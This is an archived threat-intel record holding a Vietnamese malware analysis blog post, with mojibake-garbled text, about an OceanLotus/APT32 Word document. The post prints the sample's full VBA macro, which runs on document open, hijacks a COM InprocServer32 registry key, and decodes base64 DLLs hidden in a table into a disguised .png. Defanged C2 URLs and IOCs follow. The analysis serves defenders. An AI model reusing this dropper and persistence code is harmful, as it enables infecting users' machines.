{
    "id": "c7e59c93-c900-4b19-ac57-ef3ab48875e6",
    "created_at": "2023-01-12T15:02:12.701729Z",
    "updated_at": "2025-03-27T02:16:28.855551Z",
    "deleted_at": null,
    "sha1_hash": "4bf3bac2321a119ef36475b7a54183b63d38df5d",
    "title": "2019-05-31 - Th∆∞·ªüng t·∫øt‚Ä¶.",
    "authors": "",
    "file_creation_date": "2022-05-28T15:22:58Z",
    "file_modification_date": "2022-05-28T15:22:58Z",
    "file_size": 1161559,
    "plain_text": "# Th∆∞·ªüng t·∫øt‚Ä¶.\n\n**tradahacking.vn/th∆∞·ªüng-t·∫øt-fbcbbed49da7**\n\nm4n0w4r June 2, 2019\n\n### m4n0w4r Follow May 31, 2019\n\n ¬∑\n\n 5 min read\n\n V√¥ t√¨nh nh·∫∑t ƒë∆∞·ª£c c√°i sample: https://www.virustotal.com/gui/file/9f59c397d1346f2707fc7b54fe6cb4622770accf94eb439451 4d2bf167d65007/detection\n\n\n-----\n\n### Kƒ© thu·∫≠t s·ª≠ d·ª•ng trong t√†i li·ªáu n√†y c√≥ v·∫ª li√™n quan ƒë·∫øn OceanLotus (aka APT-32): https://unit42.paloaltonetworks.com/tracking-oceanlotus-new-downloader-kerrdown/\n\n Th√¥ng tin metadata c·ªßa sample:\n\n D·∫°o v√≤ng v√≤ng trong sample ƒë·ªÉ thu th·∫≠p th√™m th√¥ng tin: üòâ\n\n\n-----\n\n### To√†n b·ªô VBA code c·ªßa sample:\n\n\n-----\n\n```\n module: ThisDocument\nAttribute VB_Name = \"ThisDocument\"\nAttribute VB_Base = \"1Normal.ThisDocument\"\nAttribute VB_GlobalNameSpace = False\nAttribute VB_Creatable = False\nAttribute VB_PredeclaredId = True\nAttribute VB_Exposed = True\nAttribute VB_TemplateDerived = True\nAttribute VB_Customizable = True\nPrivate Sub Document_Open()\n  On Error Resume Next\n  Dim sAppData As String\n  sAppData = Environ(\"APPDATA\")\n  sAppData = sAppData & \"\\main_background.png\"\n  Dim sAppDataNew As String\nsAppDataNew = Chr(34) & sAppData & Chr(34)\n  Dim myWS As Object, strPath\n  Set myWS = CreateObject(\"WScript.Shell\")\n  Set fsoCheck = VBA.CreateObject(\"Scripting.FileSystemObject\")\n  Dim iCheck As Boolean\n  iCheck = False\n  #If Win64 Then\n  #Else\n If (fsoCheck.FileExists(\"C:\\Windows\\SysWOW64\\cmd.exe\") = True) Then      \niCheck = True    Else      iCheck = False    End If\n  #End If\n        If iCheck = True Then    Dim wsh As Object    Set wsh =\nVBA.CreateObject(\"WScript.Shell\")    Dim waitOnReturn As Boolean: waitOnReturn =\nTrue    Dim windowStyle As Integer: windowStyle = 0      Else    If\nRegKeyExists(\"HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\\") = False Then      \nmyWS.RegWrite \"HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\\", \"\", \"REG_SZ\"    Else \nEnd If    If RegKeyExists(\"HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{2DEA658F54C1-4227-AF9B-260AB5FC3543}\\InprocServer32\\\") = False Then      If\nRegKeyExists(\"HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{2DEA658F-54C1-4227-AF9B260AB5FC3543}\\\") = False Then        myWS.RegWrite\n\"HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}\\\",\n\"\", \"REG_SZ\"      Else      End If          Else    End If \nEnd If  Dim b As String  Dim a As String  Dim tableNew As Table  Set tableNew\n= ActiveDocument.Tables(1)End Sub\nFunction RegKeyExists(i_RegKey As String) As Boolean\n  Dim myWS As Object\n  On Error GoTo ErrorHandler\n  Set myWS = CreateObject(\"WScript.Shell\")\n  myWS.RegRead i_RegKey\n  RegKeyExists = True\n  Exit Function\n  ErrorHandler:   'key was not found   RegKeyExists = FalseEnd Function\n\n```\n\n-----\n\n```\nFunction Base64Decode(ByVal vCode, ByVal sPath)\n  Dim oXML, oNode\n  Set oXML = CreateObject(\"Msxml2.DOMDocument.3.0\")\n  Set oNode = oXML.CreateElement(\"base64\")\n  oNode.dataType = \"bin.base64\"\n  oNode.Text = vCode\n  Set objStream = CreateObject(\"ADODB.Stream\")\n  objStream.Type = 1\n  objStream.Open\n  objStream.Write oNode.nodeTypedValue\n  objStream.SaveToFile sPath, 2\n    Set objStream = Nothing  Set oNode = Nothing  Set oXML = NothingEnd\nFunction\n\n### C∆° b·∫£n VBA code n√†y l√†m nhi·ªám v·ª•:\n\n C·∫•u th√†nh ƒë∆∞·ªùng d·∫´n cho t·∫≠p tin Ki·ªÉm tra m√¥i tr∆∞·ªùng hi·ªán h√†nh l√† hay. N·∫øu l√† 64-bit th√¨ s·∫Ω th·ª±c thi l·ªánh:\nwsh.Run \"cmd.exe /S /C reg add HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{2DEA658F54C1-4227-AF9B-260AB5FC3543}\\InprocServer32 /ve /t REG_SZ /d \" & sAppDataNew & \" /f\n/reg:64\", windowStyle, waitOnReturn\n\n ng∆∞·ª£c l·∫°i, th·ª±c thi l·∫ßn l∆∞·ª£t:\nmyWS.RegWrite \"HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{2DEA658F-54C1-4227-AF9B260AB5FC3543}\\\", \"\", \"REG_SZ\"v√† myWS.RegWrite\n\"HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{2DEA658F-54C1-4227-AF9B260AB5FC3543}\\InprocServer32\\\", sAppDataNew, \"REG_SZ\"\n\n D·ª±a v√†o t·ª´ kh√≥a InprocServer32, ta c√≥ th·ªÉ bi·∫øt ƒë∆∞·ª£c file %APPDATA%\\main_background.png s·∫Ω l√† m·ªôt t·∫≠p tin dll\n\n Sau khi thi·∫øt l·∫≠p th√†nh c√¥ng Registry, ti·∫øn h√†nh decode base64data v√† ghi ra file D·ª±a v√†o bi·∫øn ƒë·ªÉ drop ra dll x64 hay dll x32:\nSet tableNew = ActiveDocument.Tables(1)  If (iCheck = True) Then    a =\ntableNew.Cell(1, 1).Range.Text //l·∫•y base64data t·∫°i h√†ng 1 c·ªôt 1 (32bit-dll)    a\n= Left(a, Len(a) - 2)    b = Base64Decode(a, sAppData)  Else    a =\ntableNew.Cell(1, 2).Range.Text //l·∫•y base64data t·∫°i h√†ng 1 c·ªôt 2 (64-bit dll)    \na = Left(a, Len(a) - 2)    b = Base64Decode(a, sAppData)  End If\n\n```\n\n-----\n\n### CƒÉn c·ª© v√†o th√¥ng tin c√≥ ƒë∆∞·ª£c ti·∫øn h√†nh decode ƒë·ªÉ l·∫•y c√°c binary. C√≥ th·ªÉ debug ho·∫∑c l√† d√πng Cyberchef:\n\n 32-bit dll:\n\n 64-bit dll:\n\n\n-----\n\n### T√¥i th·∫•y attacker c√≥ v·∫ª h∆°i nh·∫ßm trong qu√° tr√¨nh decode v√† ghi ra file. N·∫øu l√† OS 64-bit th√¨ l·∫°i drop ra 32-bit dll. C√≤n ng∆∞·ª£c l·∫°i, v·ªõi OS 32-bit l·∫°i drop ra 64-bit dll üòï\n\n Ki·ªÉm tra s∆° b·ªô c√°c dll\n\n V·ªõi 32-bit dll:\n```\n000000011530  000010013730   0  XA:\\Code\\Macro_NB2\\Request\\PostData32.exe -u\nhxxps://syn[.]servebbs[.]com/id32[.]png -t 300000\n\n V·ªõi 64-bit dll:\n\n```\n\n-----\n\n```\n000000014243  0000000141D0   0  YA:\\Code\\Macro_NB2\\Request\\PostData64.exe -u\nhxxps://syn[.]servebbs[.]com/id64.png -t 300000\n\n### Th·ª≠ load file v·ªÅ nh∆∞ng C2 ƒë√£ d·∫πo:\n\n## IOCs:\n\n### Doc sample: 9f59c397d1346f2707fc7b54fe6cb4622770accf94eb4394514d2bf167d65007\n\n Dropped file (based on architecture):\n\n 32-bit dll: ee1e3956df9f69ae3c87a53075881f65 64-bit dll: c74a24dea88999797aaceeecd63efaff\n\n Some C2:\n\n hxxps://word[.]webhop[.]info ( 109[.]248[.]149[.]96) hxxps://syn[.]servebbs[.]com ( 194[.]9[.]177[.]13)\n\n```\n\n-----\n\n### End.\n\n\n-----",
    "language": "VI",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-05-31 - Th∆∞·ªüng t·∫øt‚Ä¶..pdf"
    ],
    "report_names": [
        "2019-05-31 - Th∆∞·ªüng t·∫øt‚Ä¶..pdf"
    ],
    "threat_actors": [
        {
            "id": "870f6f62-84f5-48ca-a18e-cf2902cd6924",
            "created_at": "2022-10-25T15:50:23.303818Z",
            "updated_at": "2025-03-27T02:00:55.435309Z",
            "deleted_at": null,
            "main_name": "APT32",
            "aliases": [
                "APT32",
                "SeaLotus",
                "OceanLotus",
                "APT-C-00",
                "Canvas Cyclone"
            ],
            "source_name": "MITRE:APT32",
            "tools": [
                "Mimikatz",
                "ipconfig",
                "Kerrdown",
                "Cobalt Strike",
                "SOUNDBITE",
                "OSX_OCEANLOTUS.D",
                "KOMPROGO",
                "netsh",
                "RotaJakiro",
                "PHOREAL",
                "Arp",
                "Denis",
                "Goopy"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "af509bbb-8d18-4903-a9bd-9e94099c6b30",
            "created_at": "2023-01-06T13:46:38.585525Z",
            "updated_at": "2025-03-27T02:00:02.866727Z",
            "deleted_at": null,
            "main_name": "APT32",
            "aliases": [
                "TIN WOODLAWN",
                "OceanLotus Group",
                "OceanLotus",
                "Sea Lotus",
                "G0050",
                "Cobalt Kitty",
                "SeaLotus",
                "ATK17",
                "Ocean Lotus",
                "Ocean Buffalo",
                "POND LOACH",
                "Canvas Cyclone",
                "APT-C-00",
                "APT-32",
                "APT 32"
            ],
            "source_name": "MISPGALAXY:APT32",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f1518ac1-4710-4dd1-a422-e3801e4806cb",
            "created_at": "2024-05-01T02:03:08.147856Z",
            "updated_at": "2025-03-27T02:05:17.421275Z",
            "deleted_at": null,
            "main_name": "TIN WOODLAWN",
            "aliases": [
                "Cobalt Kitty",
                "OceanLotus",
                "WOODLAWN ",
                "APT32 "
            ],
            "source_name": "Secureworks:TIN WOODLAWN",
            "tools": [
                " Denis",
                " Goopy",
                " JEShell",
                " KerrDown",
                " Mimikatz",
                " Ratsnif",
                " Remy",
                " Rizzo",
                " RolandRAT",
                "Cobalt Strike"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "2439ad53-39cc-4fff-8fdf-4028d65803c0",
            "created_at": "2022-10-25T16:07:23.353204Z",
            "updated_at": "2025-03-27T02:02:09.749502Z",
            "deleted_at": null,
            "main_name": "APT 32",
            "aliases": [
                "APT 32",
                "APT-C-00",
                "APT-LY-100",
                "ATK 17",
                "Lotus Bane",
                "Ocean Buffalo",
                "OceanLotus",
                "Operation Cobalt Kitty",
                "Operation PhantomLance",
                "Pond Loach",
                "SeaLotus",
                "SectorF01",
                "Tin Woodlawn"
            ],
            "source_name": "ETDA:APT 32",
            "tools": [
                "Agentemis",
                "Android.Backdoor.736.origin",
                "AtNow",
                "Backdoor.MacOS.OCEANLOTUS.F",
                "BadCake",
                "CACTUSTORCH",
                "CamCapture Plugin",
                "CinaRAT",
                "Cobalt Strike",
                "CobaltStrike",
                "Cuegoe",
                "DKMC",
                "Denis",
                "Goopy",
                "HiddenLotus",
                "KOMPROGO",
                "KerrDown",
                "METALJACK",
                "MSFvenom",
                "Mimikatz",
                "Nishang",
                "OSX_OCEANLOTUS.D",
                "OceanLotus",
                "PHOREAL",
                "PWNDROID1",
                "PhantomLance",
                "PowerSploit",
                "Quasar RAT",
                "QuasarRAT",
                "RatSnif",
                "Remy",
                "Remy RAT",
                "Rizzo",
                "Roland",
                "Roland RAT",
                "SOUNDBITE",
                "Salgorea",
                "Splinter RAT",
                "Terracotta VPN",
                "Yggdrasil",
                "cobeacon",
                "denesRAT",
                "fingerprintjs2"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535732,
    "ts_updated_at": 1743041788,
    "ts_creation_date": 1653751378,
    "ts_modification_date": 1653751378,
    "files": {
        "pdf": "https://archive.orkl.eu/4bf3bac2321a119ef36475b7a54183b63d38df5d.pdf",
        "text": "https://archive.orkl.eu/4bf3bac2321a119ef36475b7a54183b63d38df5d.txt",
        "img": "https://archive.orkl.eu/4bf3bac2321a119ef36475b7a54183b63d38df5d.jpg"
    }
}